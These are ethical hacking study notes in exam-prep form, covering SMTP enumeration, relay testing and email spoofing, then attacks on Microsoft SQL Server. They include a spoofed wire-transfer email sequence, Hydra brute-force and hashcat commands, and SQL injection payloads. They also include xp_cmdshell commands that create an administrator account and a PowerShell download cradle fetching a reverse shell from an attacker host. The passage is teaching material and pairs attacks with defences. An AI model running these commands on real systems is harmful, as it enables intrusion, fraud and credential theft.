# SECTION 5: KTU 2024 Scheme Examination Question Bank & Topic Recap

## 5.1 Part A Questions (2 Marks Each — Short Answer)

### **Question 1** `[KTU University Exam – May 2024 Model]`

**Q: Define SMTP and explain why the VRFY command is considered a security risk.**

**Model Answer (2 marks):**

**Definition (1 mark):** SMTP (Simple Mail Transfer Protocol) is a text-based application-layer protocol defined in RFC 5321, used for transmitting electronic mail between mail servers (MTAs) and from clients to servers (MSAs). It operates on **TCP port 25** for relay and **TCP port 587** for message submission.

**Security Risk (1 mark):** The `VRFY` command allows an attacker to verify whether a specific mailbox exists on the server. Since the server returns differential responses (`250 OK` for existing users, `550 User unknown` for non-existing users), attackers can enumerate valid email accounts for **password brute-force, spear-phishing, and credential stuffing attacks**. It is therefore recommended to disable `VRFY` and `EXPN` on production mail servers.

---

### **Question 2** `[KTU University Exam – Dec 2023 Model]`

**Q: What is an SMTP open relay? How is it tested?**

**Model Answer (2 marks):**

**Definition (1 mark):** An **SMTP open relay** is a mail server that forwards (relays) email from **unauthenticated senders to recipients outside its authorized domain**. This misconfiguration allows spammers and attackers to abuse the server for sending phishing, malware, or spam, while masking their true origin.

**Testing procedure (1 mark):** The test involves connecting to the SMTP server via Telnet on port 25 and issuing a relay sequence:
```
MAIL FROM:<external@attacker.com>
RCPT TO:<victim@target.com>
```
If the server returns `250 OK` (accepted), it is an **open relay**. A hardened server responds with `554 Relay access denied` or `550 User unknown`.

---

## 5.2 Part B Questions (14 Marks Each — Full-Length Answers)

> [!IMPORTANT]
> **KTU ESE Pattern Note:** Each 14-mark question has two sub-parts of **7 marks each**. The internal choice allows the candidate to attempt either **Question A OR Question B**. Both questions are provided below for comprehensive preparation.

---

### **Question A (14 Marks)** `[KTU University Exam – Model Paper Pattern]`

**Q: (a)** Explain the SMTP protocol architecture with a neat diagram. List the commonly used SMTP commands and describe their functions. **(7 marks)**

**(b)** Describe in detail the **SMTP enumeration attack** methodology. Include the tools used, commands executed, and defensive countermeasures. **(7 marks)**

---

#### **Solution for Question A(a) — 7 Marks**

**SMTP Protocol Architecture (3 marks):**

SMTP follows a **client-server, command-response model** operating over TCP. The architecture involves three primary components:

1. **MUA (Mail User Agent):** End-user email client (e.g., Outlook, Thunderbird).
2. **MSA (Mail Submission Agent):** Receives mail from MUA (port 587).
3. **MTA (Mail Transfer Agent):** Server-to-server relay (port 25).
4. **MDA (Mail Delivery Agent):** Delivers mail to local mailbox.
5. **MRA (Mail Retrieval Agent):** POP3/IMAP for client retrieval.

**SMTP Session Flow:**
1. TCP handshake on port 25.
2. Server sends `220` banner.
3. Client sends `HELO` or `EHLO` to identify itself.
4. Server returns `250 OK` with ESMTP capabilities.
5. `MAIL FROM` establishes sender.
6. `RCPT TO` establishes recipient(s).
7. `DATA` initiates message body transmission.
8. `<CR><LF>.<CR><LF>` terminates message.
9. `QUIT` ends session.

**Key SMTP Commands Table (2 marks):**

| Command | Function |
|---|---|
| `HELO` / `EHLO` | Client identifies itself; `EHLO` requests extended SMTP |
| `MAIL FROM` | Declares the envelope sender (spoofable) |
| `RCPT TO` | Declares the recipient; used for enumeration |
| `DATA` | Begins message body transmission |
| `RSET` | Aborts current transaction |
| `VRFY` | Verifies a mailbox (enumeration risk) |
| `EXPN` | Expands a mailing list (enumeration risk) |
| `NOOP` | No operation; keepalive |
| `QUIT` | Terminates the session |
| `AUTH` | Initiates authentication |
| `STARTTLS` | Upgrades to TLS encryption |

**Conclusion (1 mark):** SMTP is a stateless, text-based protocol that trusts the sender's identity. This trust-based design is the root cause of modern email-borne attacks, mitigated only by add-on protocols (SPF, DKIM, DMARC) rather than SMTP itself.

---

#### **Solution for Question A(b) — 7 Marks**

**SMTP Enumeration — Detailed Methodology (4 marks):**

**Step 1: Reconnaissance**
- Identify the MX (Mail Exchange) records: `dig MX target.com`
- Scan for SMTP ports: `nmap -sV -p25,465,587 mail.target.com`

**Step 2: Banner Grabbing**
- Connect via Telnet: `telnet mail.target.com 25`
- Capture version string from `220` banner.

**Step 3: ESMTP Capability Enumeration**
- Issue `EHLO test`
- Map extensions (`STARTTLS`, `AUTH`, `SIZE`, etc.)

**Step 4: User Enumeration via VRFY/EXPN/RCPT TO**
```
VRFY admin
250 OK                    ← User exists
VRFY nobody
550 User unknown          ← User does not exist
```

**Step 5: Automated Enumeration**
- `smtp-user-enum -M VRFY -U users.txt -t mail.target.com`
- `nmap --script smtp-enum-users -p25 mail.target.com`
- Metasploit: `auxiliary/scanner/smtp/smtp_enum`

**Step 6: Open Relay Testing**
- Issue relay test sequence and analyze response codes.

**Tools Summary (1.5 marks):**

| Tool | Purpose |
|---|---|
| **Telnet / Netcat** | Manual interaction |
| **Nmap + NSE scripts** | Automated scanning and enumeration |
| **smtp-user-enum** | Dedicated user enumeration |
| **Metasploit Framework** | `smtp_enum`, `smtp_version` modules |
| **Hydra / Medusa** | Authentication brute force |
| **Swaks** | Spoofed email crafting |
| **Wireshark** | Cleartext credential sniffing |

**Defensive Countermeasures (1.5 marks):**

1. **Disable VRFY and EXPN** in MTA configuration.
2. **Enforce SMTP AUTH** on submission (port 587).
3. **Force STARTTLS** to prevent sniffing.
4. **Implement rate limiting and fail2ban** to block brute force.
5. **Deploy SPF, DKIM, and DMARC** for sender validation.
6. **Suppress version disclosure** in `220` banner.
7. **Enable audit logging** and SIEM integration.
8. **Block outbound relay** to non-authorized domains.
9. **Implement Multi-Factor Authentication (MFA)** for mail access.

---

### **Question B (14 Marks) — Alternative Choice** `[KTU University Exam – Model Paper Pattern]`

**Q: (a)** Discuss **email spoofing** and **phishing attacks** via SMTP. Explain the entire attack chain with appropriate examples. **(7 marks)**

**(b)** Explain the concept of **SMTP authentication brute force** and **cleartext credential sniffing**. Describe the tools, techniques, and mathematical estimation of attack feasibility. **(7 marks)**

---

#### **Solution for Question B(a) — 7 Marks**

**Email Spoofing (3 marks):**

Email spoofing is the forgery of an email header so that the message appears to originate from a source other than the actual sender. SMTP performs **no inherent sender verification** in the `MAIL FROM` envelope; therefore, the protocol natively permits spoofing.

**Phishing Attacks (2 marks):**

Phishing is a social-engineering attack where the spoofed email contains a malicious link, attachment, or urgent request designed to harvest credentials, install malware, or initiate fraudulent financial transactions.

**Attack Chain (Step-by-Step) (2 marks):**

1. **Reconnaissance:** Attacker enumerates valid employees via SMTP enumeration.
2. **Target Selection:** Attacker chooses a high-value target (e.g., CFO, HR manager).
3. **Spoofed Header Construction:** Attacker sets `MAIL FROM: ceo@target.com` while connecting from an external IP.
4. **Payload Crafting:** Phishing email contains a link to a fake login portal (`http://target-login.evil.com`).
5. **Delivery:** Attacker uses `swaks` or Telnet to deliver the spoofed mail.
6. **Victim Interaction:** Victim clicks link, enters credentials on fake portal.
7. **Credential Harvest:** Attacker captures credentials and authenticates to legitimate mail server.
8. **Post-Exploitation:** Attacker reads sensitive mail, sends BEC (Business Email Compromise) messages, exfiltrates data.

**Example Spoof Command Sequence:**
```
telnet mail.target.com 25
HELO attacker.evil.com
MAIL FROM:<ceo@target.com>
RCPT TO:<cfo@target.com>
DATA
Subject: Urgent Wire Transfer Required
From: CEO <ceo@target.com>
To: CFO <cfo@target.com>

Please process immediate payment to Account X.
.
QUIT
```

**Mitigations:** SPF (Sender Policy Framework), DKIM (DomainKeys Identified Mail), DMARC (Domain-based Message Authentication, Reporting & Conformance), and user security awareness training.

---

#### **Solution for Question B(b) — 7 Marks**

**SMTP Authentication Brute Force (3 marks):**

A brute-force attack systematically attempts all possible username/password combinations against the SMTP `AUTH` mechanism. Because the `AUTH LOGIN` and `AUTH PLAIN` methods transmit credentials as **Base64-encoded** (reversible, not encrypted) values, attackers can:

1. **Sniff credentials** in transit (cleartext on port 25).
2. **Brute-force credentials** using tools like Hydra or Medusa.
3. **Spray common passwords** across multiple accounts to evade lockout.

**Cleartext Credential Sniffing (2 marks):**

When SMTP runs on port 25 without STARTTLS, the entire session—including authentication—is transmitted in plaintext. An attacker on the same network segment can use **Wireshark** or `tcpdump` to capture the `AUTH LOGIN` exchange and decode the Base64 strings to recover the username and password.

**Mathematical Feasibility Estimation (2 marks):**

For a dictionary of size $\vert W \vert$ and parallel threads $N$:

$$
T_{\text{crack}} = \frac{\vert W \vert}{N \times f_{\text{auth}}}
$$

Where $f_{\text{auth}}$ is the authentication rate (attempts/second).

**Example Calculation:**
- $\vert W \vert = 10^7$ (10 million passwords)
- $N = 16$ parallel threads
- $f_{\text{auth}} = 2$ attempts/sec/thread (network + server RTT)

$$
T_{\text{crack}} = \frac{10^7}{16 \times 2} = 312{,}500 \text{ s} \approx 86.8 \text{ hours}
$$

With account lockout (5 attempts), attack duration becomes effectively infinite for targeted accounts but feasible for **password spraying** (1 password × many users).

**Defenses:** Enforce TLS (STARTTLS), implement account lockout, deploy MFA, use rate limiting, monitor SIEM for failed auth spikes.

---

> [!WARNING]
> **KTU Examiner's Valuation Pitfall Callout**
> 1. **Do NOT confuse SMTP enumeration with active intrusion.** Enumeration is passive reconnaissance (information gathering) and is **non-destructive** — it does not modify server state.
> 2. **Always mention RFC numbers** (RFC 5321 for SMTP, RFC 6376 for DKIM, RFC 7208 for SPF) in answers — examiners allocate marks for protocol-level citations.
> 3. **Distinguish "Base64 encoding" from "encryption"** — this is a common trap question. Base64 is a **reversible encoding** (not a cryptographic protection).
> 4. **Mention both the attack AND its mitigation** for full marks. KTU 2024 scheme rewards "attack + defense" balanced answers under the NEP 2020 outcome-based framework.
> 5. **Differential response codes** (`250` vs `550`) are the mathematical basis of enumeration — explicitly state this in enumeration answers.
> 6. **Do NOT suggest disabling SMTP entirely** as a defense — this is operationally infeasible. Always suggest protocol-level mitigations (STARTTLS, SPF, DKIM, DMARC, MFA).
> 7. **Spell out acronyms on first use:** Simple Mail Transfer Protocol (SMTP), Mail Transfer Agent (MTA), Sender Policy Framework (SPF), etc.

---

## 5.3 Topic Recap & Important Things to Remember

> [!NOTE]
> **High-Density Revision Checklist — Must Memorize for KTU Exam**

- ✅ **SMTP** = RFC 5321, text-based, application-layer, TCP ports **25 (relay)**, **587 (submission)**, **465 (legacy TLS)**.
- ✅ **Core SMTP commands:** `HELO`, `EHLO`, `MAIL FROM`, `RCPT TO`, `DATA`, `QUIT`, `VRFY`, `EXPN`, `AUTH`, `STARTTLS`, `RSET`, `NOOP`.
- ✅ **Response codes:** `220` (ready), `250` (success), `354` (send data), `550` (user unknown), `554` (relay denied).
- ✅ **Five attack classes:** (1) Banner grabbing, (2) User enumeration, (3) Open relay exploitation, (4) Auth brute force / sniffing, (5) Email spoofing & phishing.
- ✅ **VRFY and EXPN** = primary enumeration vectors; must be **disabled** on hardened servers.
- ✅ **Differential response analysis** = mathematical foundation of enumeration: `250` (exists) vs `550` (not found).
- ✅ **Open relay test:** external `MAIL FROM` + external `RCPT TO` → if `250 OK`, vulnerable.
- ✅ **Base64 ≠ Encryption:** `AUTH LOGIN` transmits cleartext-equivalent credentials.
- ✅ **Email spoofing** exploits lack of sender verification in `MAIL FROM` envelope.
- ✅ **Defense triad:** **SPF** (RFC 7208) + **DKIM** (RFC 6376) + **DMARC** (RFC 7489).
- ✅ **Key tools:** Telnet, Netcat, Nmap + NSE, Metasploit (`smtp_enum`, `smtp_version`), Hydra, Medusa, Swaks, Wireshark, smtp-user-enum.
- ✅ **MITRE ATT&CK mapping:** T1589.002 (Email Addresses reconnaissance), T1078.003 (Valid Accounts: Local Accounts), T1566.001 (Spearphishing Attachment).
- ✅ **Course Outcomes (COs) covered:** **CO2** (Identify vulnerabilities), **CO3** (Apply attack vectors), **CO5** (Recommend countermeasures).
- ✅ **Remember the Kill Chain position:** SMTP enumeration = *Reconnaissance*; SMTP brute force = *Exploitation*; SMTP spoofing = *Action on Objectives*.

---

<!-- SECTION_5_END -->

topics.title: Attacking SQL Servers
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PBCCT604 - ETHICAL HACKING & IOT SECURITY
> - **Module:** Module 2
> - **Topic:** Attacking SQL Servers

<!-- SECTION_1_START -->
# SECTION 1: Core Technical Definition & Intuitive Overview

## 1.1 Formal Academic Definition (KTU 2024 Syllabus Terminology)

**Attacking SQL Servers** refers to the systematic set of offensive security methodologies, reconnaissance techniques, exploitation frameworks, and post-exploitation procedures employed by ethical hackers and penetration testers to identify vulnerabilities, gain unauthorized access, escalate privileges, and exfiltrate data from Microsoft SQL Server (MSSQL) database management systems. Within the KTU 2024 Ethical Hacking & IoT Security syllabus (PBCCT604, Module 2), this topic encompasses SQL Server discovery, enumeration of instances and databases, authentication attacks, SQL injection exploitation, privilege escalation, and data extraction — all executed within a controlled, authorized penetration testing environment.

> [!IMPORTANT]
> **KTU 2024 Module 2 Focus:** The module covers scanning, enumeration, vulnerability assessment, and exploitation of database servers (especially MSSQL and MySQL) as a critical phase within the broader "Hacking Web Servers & SQL Servers" track of the Ethical Hacking curriculum.

## 1.2 Conceptual Analogy / Intuition

Imagine a corporate office building (the **SQL Server**) that stores its most confidential files in a vault deep inside the building. A penetration tester (ethical hacker) is given permission to break into the building, but only to find weaknesses — not to actually steal anything.

The attacker first **scouts the neighborhood** (Scanning — using tools like SQLPing, SQLPing3, or Nmap scripts) to find which buildings are SQL Server offices and what doors/windows they have open (TCP port **1433** is the default, **1434** for the SQL Browser service, and dynamic ports for named instances).

Next, the attacker **checks the lobby directory** (Enumeration) to discover what instances, databases, and login credentials exist. Then comes the **lock-picking phase** (Exploitation) — trying default credentials like `sa` (System Administrator), brute-forcing weak passwords, or using SQL Injection to slip malicious queries past the front desk.

Once inside, the attacker explores whether they can access the manager's office (Privilege Escalation using `xp_cmdshell`), steal documents (Data Exfiltration using tools like Metasploit's `mssql_payload` modules), or even sneak into the building's HVAC system (post-exploitation command execution on the underlying Windows OS).

> [!NOTE]
> **Key Intuition:** Attacking SQL Servers is essentially a layered intrusion — discovery → enumeration → authentication bypass → exploitation → privilege escalation → data theft. Each stage builds upon information gathered in the previous one, much like a detective following breadcrumbs.

## 1.3 Critical Constants and Standard Metrics

- **Default MSSQL TCP Port:** **1433**
- **SQL Browser / Resolution Service UDP Port:** **1434**
- **Named Instance Dynamic Port Range:** Typically **49152–65535** (configurable)
- **Default Administrator Account:** **`sa`** (System Administrator) — a highly privileged built-in login
- **Authentication Modes:** **Windows Authentication Mode** (integrated) and **Mixed Mode** (Windows + SQL Server authentication)
- **Default Database:** **`master`**, **`model`**, **`msdb`**, **`tempdb`**
- **Common Default Passwords (historical):** Often blank for `sa` in older installations
- **SQL Server Versions in Scope:** Microsoft SQL Server **2000, 2005, 2008, 2012, 2014, 2016, 2017, 2019, 2022**

> [!WARNING]
> **Examination Trap:** Students often confuse **port 1433** (SQL Server main service) with **port 1434** (SQL Server Browser Service). Examiners frequently test this distinction.

---

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
# SECTION 2: Deep Theoretical Analysis & KTU High-Yield Formula Sheet

## 2.1 The Attack Methodology — Structured Logic Breakdown

The attack lifecycle against MSSQL follows a systematic, reconnaissance-to-exploitation pipeline. Each phase has specific tools, techniques, and objectives.

### **Phase 1: Discovery / Scanning**

**Objective:** Locate MSSQL servers on the network.

**Techniques:**
- **Port Scanning** for TCP **1433** and UDP **1434**
- **Nmap Service Version Detection** using the `-sV` flag
- **MSSQL Ping** using dedicated tools like **SQLPing** and **SQLPing3**

**Why This Step Matters:** Without locating the target server, no further attack is possible. MSSQL servers are often deployed in **DMZ networks** of enterprise environments, making them prime targets for external attackers.

### **Phase 2: Enumeration**

**Objective:** Extract metadata — instance names, database names, usernames, version info.

**Tools & Techniques:**
- **Metasploit Framework auxiliary modules:** `mssql_ping`, `mssql_enum`, `mssql_login`
- **SQLCMD** and **OSQL** command-line utilities
- **MSSQL Server Resolution Protocol (SSRP)** — query UDP 1434 to discover named instances and dynamic ports
- **Microsoft SQL Server Management Studio (SSMS)** — when credentials are known

**Information Gathered:**
- Server version (e.g., `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5`)
- Instance names (default + named)
- List of databases
- Linked servers
- Active users and roles

### **Phase 3: Authentication Attacks**

**Objective:** Obtain valid credentials for the MSSQL server.

**Attack Vectors:**

| Attack Type | Description | Typical Tool |
|---|---|---|
| **Default Credential Attack** | Try `sa` with blank/known passwords | Hydra, Medusa |
| **Dictionary Attack** | Brute-force using common password lists | Hydra, John the Ripper |
| **Brute-Force Attack** | Try all character combinations (computationally expensive) | Hydra with custom wordlist |
| **Sniffing** | Capture credentials from network traffic (in non-encrypted setups) | Wireshark, Cain & Abel |
| **Hash Theft** | Extract password hashes from `sysxlogins` table, then crack offline | Metasploit `mssql_hashdump` |

### **Phase 4: Exploitation**

**Objective:** Execute arbitrary SQL or OS commands on the target.

**Key Modules (Metasploit Framework):**
- `exploit/windows/mssql/mssql_payload` — uploads and executes a payload
- `auxiliary/admin/mssql/mssql_exec` — runs SQL/OS commands
- `exploit/windows/mssql/mssql_relay` — NTLM relay attacks

**SQL Injection Categories (relevant to MSSQL):**
1. **Tautology-based** — `' OR 1=1 --`
2. **Union-based** — `' UNION SELECT username, password FROM users--`
3. **Error-based** — `'; AND 1=CONVERT(int, (SELECT @@version))--`
4. **Blind (Boolean & Time-based)** — `'; IF (1=1) WAITFOR DELAY '0:0:5'--`
5. **Stacked Queries** — `'; EXEC xp_cmdshell('whoami')--`

### **Phase 5: Privilege Escalation**

**Objective:** Move from low-privileged user to `sa` or even SYSTEM-level Windows access.

**MSSQL-Specific Escalation:**
- Enable `xp_cmdshell` (if disabled by admin):
  ```sql
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  ```
- Execute OS commands through `xp_cmdshell`:
  ```sql
  EXEC xp_cmdshell 'net user hacker P@ssw0rd /add';
  EXEC xp_cmdshell 'net localgroup administrators hacker /add';
  ```
- Token impersonation, database linking abuse, and SQL Server Agent job abuse.

### **Phase 6: Data Exfiltration & Post-Exploitation**

**Objective:** Extract sensitive data and maintain access.

**Techniques:**
- Bulk data export via `bcp` utility or `OPENROWSET(BULK ...)`
- Use Metasploit's `mssql_hashdump` post-module to extract password hashes
- Pivot to other internal systems using the compromised MSSQL host
- Establish persistent backdoors via stored procedures or scheduled jobs

## 2.2 KTU High-Yield Formula Sheet / Cheat Sheet

| Concept | Definition / Formula | Notes |
|---|---|---|
| Default TCP Port | **1433** | MSSQL main service |
| Browser Service UDP Port | **1434** | SSRP — used for instance discovery |
| Default Admin Account | **`sa`** | Highest privilege in MSSQL |
| Authentication Modes | **Windows** OR **Mixed** | Mixed = Windows + SQL logins |
| `xp_cmdshell` | Extended stored procedure | Allows OS command execution |
| `OPENROWSET` | Ad-hoc remote query method | Used for linked server queries |
| Hash Extraction Query | `SELECT name, password_hash FROM sys.sql_logins` | Requires `CONTROL SERVER` privilege |
| Nmap MSSQL Script | `nmap -p 1433 --script ms-sql-info <target>` | Reveals version, instance, configs |
| `WAITFOR DELAY` | `WAITFOR DELAY '0:0:5'` | Time-based blind SQLi fingerprinting |
| `xp_dirtree` | Network share enumeration | Lateral movement reconnaissance |
| `sp_password` | Legacy password change proc | Often disabled in modern versions |

## 2.3 Real-World Utility in Engineering Fields

- **Cybersecurity Consulting:** Penetration testers use these methodologies to audit enterprise database security.
- **Incident Response:** SOC analysts use the same techniques in reverse to identify attacker footprints.
- **Database Hardening:** Understanding attack vectors enables defensive configuration (e.g., disabling `sa`, enforcing strong passwords, enabling TDE).
- **Compliance Auditing:** PCI-DSS, HIPAA, and GDPR all require periodic database penetration testing.
- **Red Team Operations:** Adversary simulation engagements test an organization's blue team detection capabilities.

> [!NOTE]
> **Engineering Insight:** MSSQL is the second most widely deployed RDBMS globally (after Oracle in enterprise contexts). A compromised MSSQL server typically grants the attacker a foothold into the broader Windows Active Directory domain, making it a **high-value target** in the kill chain.

---

# SECTION 3: Step-by-Step Derivations & Analytical Matrix

## 3.1 Analytical Matrix — Attack Flow Decision Tree

The attack progression is governed by **conditional logic** at each phase. Below is the exhaustive analytical breakdown:

**Step 1: Port Discovery**
- **Action:** `nmap -sS -p 1433,1434 <target_IP>`
- **Logic:** If port 1433 is open → MSSQL main service likely running. If port 1434 (UDP) responds → SQL Browser service active → named instances exist.
- **Outcome:** Confirmed target list with service fingerprint.

**Step 2: Version Fingerprinting**
- **Action:** Connect to TCP 1433 and request a pre-login response
- **Logic:** MSSQL servers transmit a banner containing version information (e.g., `15.0.2000.5` = SQL Server 2019)
- **Exploit Selection:** Determines applicable CVEs and Metasploit modules

**Step 3: Instance Enumeration (SSRP Abuse)**
- **Action:** Send a UDP packet to port 1434 with payload `\x02` (CLNT_BCAST_EX)
- **Logic:** The SQL Browser responds with all instance names and their port mappings
- **Tool:** `mssql_ping` in Metasploit automates this

**Step 4: Authentication Attempt**
- **Action:** `use auxiliary/scanner/mssql/mssql_login`
- **Logic:** Try credential pairs from a wordlist. Track `RHOSTS`, `RPORT`, `USERNAME`, `PASSWORD` options.
- **Success Indicator:** Server returns "Login successful" → credentials valid

**Step 5: Privilege Check**
- **Action:** After login, query `SELECT IS_SRVROLEMEMBER('sysadmin')`
- **Logic:** Returns `1` (true) if current user is a sysadmin, else `0` (false)
- **Decision:** If `0` → attempt privilege escalation. If `1` → proceed to data exfiltration.

**Step 6: Enable `xp_cmdshell` (if sysadmin)**
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
- **Logic:** Modern SQL Servers disable `xp_cmdshell` by default. The above four-statement sequence re-enables it.
- **Verification:** `EXEC xp_cmdshell 'whoami'` should return the Windows user context.

**Step 7: Payload Deployment**
```sql
EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(''http://attacker/revshell.ps1'')"';
```
- **Logic:** Drops a reverse shell onto the host, granting the attacker interactive Windows access.

## 3.2 Mathematical Derivation — Brute-Force Complexity

When discussing authentication attacks, the **expected number of attempts** before a successful login follows a probability model:

$$E[\text{Attempts}] = \frac{N+1}{2}$$

where $N$ is the total number of possible passwords in the search space.

For a password of length $L$ drawn from an alphabet of size $A$:

$$N = A^L$$

Substituting:

$$E[\text{Attempts}] = \frac{A^L + 1}{2}$$

**Example Derivation — Standard 8-Character Mixed Password:**

$$\text{Alphabet} = 26_{\text{lowercase}} + 26_{\text{uppercase}} + 10_{\text{digits}} + 32_{\text{symbols}} = 94$$

$$N = 94^8 = 6{,}095{,}689{,}385{,}410{,}816 \approx 6.1 \times 10^{15}$$

$$E[\text{Attempts}] = \frac{94^8 + 1}{2} \approx 3.05 \times 10^{15}$$

At a brute-force rate of $10^9$ attempts/second (achievable with modern GPUs), expected time:

$$T = \frac{3.05 \times 10^{15}}{10^9 \times 86400 \text{ sec/day}} \approx 35{,}300 \text{ days} \approx 96.7 \text{ years}$$

> [!NOTE]
> **Interpretation:** This is why attackers use **dictionary attacks** and **credential stuffing** (with leaked password lists) rather than pure brute-force — they exploit the human tendency to choose weak, predictable passwords.

## 3.3 SQL Injection — Logic Walkthrough

**Given:** A vulnerable login form that constructs SQL as:
```sql
SELECT * FROM Users WHERE username='INPUT' AND password='INPUT'
```

**Attacker Input (Tautology Attack):**
```
Username: ' OR 1=1 --
Password: anything
```

**Step-by-Step Logic Transformation:**

Step 1 — The attacker-supplied `'` closes the string literal opened by the application.

$$\text{Input substituted} \rightarrow \text{SELECT * FROM Users WHERE username='' OR 1=1 --' AND password='anything'}$$

Step 2 — The `OR 1=1` clause is a **tautology** — always evaluates to TRUE.

$$\text{Boolean Logic} \rightarrow (\text{username} = \text{empty}) \lor (1=1) = \text{TRUE}$$

Step 3 — The `--` sequence begins a **SQL comment**, neutralizing the password check.

$$\text{Final executed query} \rightarrow \text{SELECT * FROM Users WHERE (username='' OR 1=1)}$$

Step 4 — The WHERE clause returns ALL rows from the Users table.

$$\text{Result} \rightarrow \text{First row returned} = \text{Authenticated session}$$

> [!IMPORTANT]
> **KTU High-Yield Takeaway:** MSSQL uses `--` for single-line comments and `/* */` for block comments. Always mention this distinction in exam answers.

## 3.4 Comparative Analysis — MSSQL vs. MySQL vs. Oracle Attack Surfaces

| Feature | MSSQL | MySQL | Oracle |
|---|---|---|---|
| Default Port | **1433** | **3306** | **1521** |
| Default Admin | `sa` | `root` | `SYS`, `SYSTEM` |
| OS Command Execution | `xp_cmdshell` | `sys_exec` (UDF) | `DBMS_SCHEDULER` |
| Hash Extraction | `sys.sql_logins` | `mysql.user` | `dba_users` |
| Linked Server Abuse | Native (RPC) | `FEDERATED` engine | `DBLINK` |
| Brute-Force Tool Support | Excellent (Hydra) | Excellent | Moderate |

---

# SECTION 5: KTU 2024 Scheme Examination Question Bank & Topic Recap

## 5.1 Part A Questions (3 Marks Each)

### **Question 1** `[KTU University Exam - Dec 2023]`
**Explain the role of port 1433 and port 1434 in Microsoft SQL Server communication. Why is port 1434 a common target for attackers?**

**Model Answer (3 Marks):**

Port **1433** is the default TCP port on which the Microsoft SQL Server service listens for client connections. It is the primary communication channel for all SQL queries, authentication handshakes, and data transfers between clients and the server.

Port **1434** is the UDP port used by the **SQL Server Browser Service** (also called the SQL Server Resolution Service or SSRP). It functions as a directory lookup service — when a client requests a named instance, the Browser Service responds with the actual TCP port number on which that named instance is listening. 

Port 1434 is a high-value target because an attacker can send a single UDP probe to the SSRP and receive a complete inventory of all SQL Server instances, their names, versions, and dynamic port assignments — essentially a full recon disclosure with one packet. This is why MSSQL enumeration tools like `mssql_ping` and `SQLPing3` leverage this protocol.

> [!TIP]
> **Marking Tip (1 Mark Each):** Port 1433 — primary service, TCP. Port 1434 — Browser/SSRP service, UDP. Why targeted — discloses instance and port info.

### **Question 2** `[KTU University Exam - Jun 2024]`
**What is `xp_cmdshell` in Microsoft SQL Server? How do attackers abuse it for privilege escalation?**

**Model Answer (3 Marks):**

`xp_cmdshell` is an **extended stored procedure** in Microsoft SQL Server that allows the execution of arbitrary operating system commands from within a SQL session. It accepts a string command and passes it to the underlying Windows command shell (`cmd.exe`) for execution, returning the output as a rowset to the SQL caller.

Attackers abuse `xp_cmdshell` as follows:
1. **Activation:** In modern SQL Server versions, `xp_cmdshell` is disabled by default. The attacker first executes:
   ```sql
   EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
   ```
2. **Execution:** Once enabled, the attacker issues commands like:
   ```sql
   EXEC xp_cmdshell 'net user attacker P@ssw0rd /add';
   EXEC xp_cmdshell 'net localgroup administrators attacker /add';
   ```
3. **Impact:** This grants the attacker a Windows-level administrative account, effectively pivoting from a database compromise to full host (and potentially domain) control.

> [!TIP]
> **Marking Tip (1 Mark Each):** Definition, activation method, and impact of abuse.

---

## 5.2 Part B Questions (14 Marks Each — KTU ESE Module Internal Choice)

### **Question A (14 Marks)** `[KTU University Exam - Model Paper 2024]`

**(a)** Describe the complete methodology for **discovery, enumeration, and authentication attacks** against Microsoft SQL Servers. List the tools used at each stage with their specific functions. **(7 Marks)**

**(b)** Explain the various **SQL Injection attack categories** applicable to MSSQL with suitable payload examples. Discuss how MSSQL-specific functions like `WAITFOR DELAY` and `CONVERT` aid in exploitation. **(7 Marks)**

#### **Model Answer — Part (a) (7 Marks)**

**Stage 1: Discovery (2 Marks)**
- **Port Scanning:** Use `nmap -sS -p 1433,1434 <target>` to identify the default SQL Server ports. A listening service on TCP 1433 confirms MSSQL presence.
- **Service Version Detection:** `nmap -sV -p 1433 <target>` reveals the exact SQL Server version (e.g., "Microsoft SQL Server 2019 RTM").
- **MSSQL-Specific Scripts:** `nmap --script ms-sql-info,ms-sql-config,ms-sql-tables -p 1433 <target>` provides deeper insight into configuration and exposed metadata.

**Stage 2: Enumeration (2 Marks)**
- **SQL Server Resolution Protocol (SSRP):** Send a UDP packet to port 1434 using `metasploit` auxiliary module `auxiliary/scanner/mssql/mssql_ping` to discover named instances and their dynamic ports.
- **Metasploit `mssql_enum`:** Once an instance is found, use `auxiliary/admin/mssql/mssql_enum` (with valid credentials) to enumerate SQL logins, databases, and server configuration.
- **Manual Enumeration:** `SQLCMD -S <target> -E` (Windows authentication) or with `-U <user> -P <pass>` to connect and run `SELECT @@version`, `SELECT name FROM sys.databases`.

**Stage 3: Authentication Attacks (3 Marks)**
- **Default Credential Test:** The `sa` account is the highest-privileged SQL login. Older installations often left it with a blank password. Test using `hydra -l sa -P /usr/share/wordlists/rockyou.txt <target> mssql -t 4`.
- **Dictionary Attack:** `hydra -L users.txt -P passwords.txt <target> mssql` to try multiple users and passwords concurrently.
- **Hash Theft and Offline Cracking:** Use `auxiliary/admin/mssql/mssql_hashdump` to extract password hashes, then crack them with `john` or `hashcat`:
  ```
  hashcat -m 1731 hashes.txt rockyou.txt
  ```
- **Network Sniffing:** In unencrypted environments, use `Wireshark` or `Cain & Abel` to capture authentication handshakes.

#### **Model Answer — Part (b) (7 Marks)**

**SQL Injection Categories (4 Marks):**

| Category | MSSQL Payload Example | Mechanism |
|---|---|---|
| Tautology | `' OR 1=1 --` | Forces WHERE clause to always be TRUE |
| Union-based | `' UNION SELECT username, password FROM users--` | Appends additional SELECT results |
| Error-based | `' AND 1=CONVERT(int, @@version)--` | Triggers an error that leaks data |
| Blind Boolean | `' AND (SELECT SUBSTRING(@@version,1,1))='M'--` | Infers data from TRUE/FALSE responses |
| Blind Time-based | `'; IF (1=1) WAITFOR DELAY '0:0:5'--` | Uses response delay to infer data |
| Stacked Queries | `'; EXEC xp_cmdshell('whoami')--` | Executes additional statements |

**MSSQL-Specific Functions (3 Marks):**
